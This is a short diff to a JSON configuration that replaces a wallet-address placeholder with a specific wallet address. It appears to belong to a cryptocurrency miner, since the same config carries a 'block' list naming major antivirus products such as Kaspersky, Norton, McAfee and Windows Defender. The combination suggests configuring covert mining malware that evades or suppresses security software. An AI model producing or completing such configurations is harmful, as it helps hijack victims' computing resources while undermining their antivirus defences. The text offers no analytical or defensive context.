@@ -2,7 +2,7 @@
     "config": {
         "auto_reboot": "False",
         "logging": "True",
-        "wallet": "type_your_wallet_address_here",
+        "wallet": "45vMqm8qjbE26Uz4mVmRvBQSnrqQ1jNvsMXzGdP4zTbdKtZxgEEfbjkBZYTtCM2QATLtzTTWU5XdbgyTmU8ZqvgfRMZm28b",
         "block": ["avast*", "avg *", "bitdefender*", "kaspersky*", "symantec*", "norton*", "eset*", "mcafee*", "trend micro*", "sophos*", "windows defender*"]
     }
     
